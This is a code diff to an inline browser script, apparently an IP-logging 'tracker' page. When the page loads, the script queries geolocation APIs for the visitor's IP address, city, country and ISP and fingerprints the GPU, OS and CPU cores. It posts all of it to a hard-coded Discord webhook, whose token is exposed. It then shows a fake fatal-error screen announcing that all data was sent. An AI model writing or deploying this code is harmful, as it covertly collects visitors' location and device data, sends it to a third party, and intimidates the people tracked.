@@ -2,7 +2,38 @@
 (async function() {
     const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-    // 1. デバイス情報の収集 (先に取れるものを取る)
+    // 1. IPと場所を取得する「しぶとい」関数
+    async function getDeepInfo() {
+        // 第1候補: ip-api (一番詳しい)
+        try {
+            const r = await fetch('https://demo.ip-api.com/json/?fields=66846719');
+            if (r.ok) return await r.json();
+        } catch (e) {}
+
+        // 第2候補: ipapi.co (第1がダメな時)
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            if (r.ok) {
+                const d = await r.json();
+                return { query: d.ip, city: d.city, country: d.country_name, isp: d.org, timezone: d.timezone };
+            }
+        } catch (e) {}
+
+        // 第3候補: ipify (最低限IPだけは取る)
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            if (r.ok) {
+                const d = await r.json();
+                return { query: d.ip, city: "特定不能(APIブロック)", isp: "不明" };
+            }
+        } catch (e) {}
+
+        return { query: "取得失敗", city: "不明" };
+    }
+
+    const d = await getDeepInfo();
+
+    // 2. その他のデバイス情報
     let gpu = "N/A";
     try {
         const canvas = document.createElement('canvas');
@@ -11,36 +42,16 @@
         gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
     } catch(e){}
 
-    const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明";
-    let bat = "N/A";
-    try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e){}
-
-    // 2. IP取得の試行 (403回避のための二段構え)
-    let ipData = { query: "取得失敗", city: "不明", isp: "不明" };
-    try {
-        // 第1候補: ip-api (詳細が取れる)
-        const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
-        if (res.ok) ipData = await res.json();
-        else throw new Error();
-    } catch (e) {
-        try {
-            // 第2候補: ipify (IPだけは確実に取る)
-            const res2 = await fetch('https://api.ipify.org?format=json');
-            const d2 = await res2.json();
-            ipData.query = d2.ip;
-        } catch (e2) {}
-    }
-
     // 3. Discordへ送信
     const payload = {
         embeds: [{
-            title: "🚨 ターゲット捕捉 (403回避モード)",
+            title: "💀 ターゲット完全捕捉 (トリプルAPI)",
             color: 16711680,
             fields: [
-                { name: "🌐 ネットワーク", value: `**IP:** ${ipData.query}\n**場所:** ${ipData.city || "不明"}\n**ISP:** ${ipData.isp || "不明"}`, inline: false },
-                { name: "💻 ハードウェア", value: `**GPU:** ${gpu}\n**RAM:** ${ram}\n**OS:** ${navigator.platform}`, inline: false },
-                { name: "🔍 ブラウザ", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                { name: "🌐 ネットワーク", value: `**IP:** ${d.query}\n**場所:** ${d.city}, ${d.country || ""}\n**ISP:** ${d.isp}`, inline: false },
+                { name: "💻 スペック", value: `**GPU:** ${gpu}\n**OS:** ${navigator.platform}\n**コア数:** ${navigator.hardwareConcurrency}`, inline: false }
             ],
+            footer: { text: "ADLOL Tracker v3" },
             timestamp: new Date()
         }]
     };
@@ -51,7 +62,15 @@
         body: JSON.stringify(payload)
     });
 
-    // 4. 演出
-    document.body.innerHTML = '<div style="background:#000;color:#f00;height:100vh;padding:40px;font-family:monospace;"><h1>[FATAL ERROR]</h1><p>> IP: ' + ipData.query + '</p><p>> UPLOADING DATA... COMPLETE.</p></div>';
+    // 4. 演出（相手のIPをデカデカと出す）
+    document.body.innerHTML = `
+        <div style="background:#000; color:#f00; height:100vh; padding:40px; font-family:monospace;">
+            <h1>[FATAL ERROR]</h1>
+            <p>> IP ADDR: ${d.query}</p>
+            <p>> LOCATION: ${d.city}</p>
+            <p>> ALL DATA SENT TO SERVER.</p>
+            <blink>_</blink>
+        </div>
+    `;
 })();
 </script>
